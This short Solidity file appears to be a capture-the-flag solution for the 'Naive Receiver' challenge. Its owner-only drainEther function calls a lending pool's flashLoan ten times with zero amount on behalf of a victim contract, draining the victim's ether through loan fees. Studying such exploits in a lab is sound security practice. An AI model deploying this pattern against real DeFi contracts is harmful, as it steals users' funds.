// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./NaiveReceiverLenderPool.sol";

contract Attack is Ownable {
    function drainEther(address vulnerableAddress, address payable pool)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(vulnerableAddress, 0);
        }
    }
}
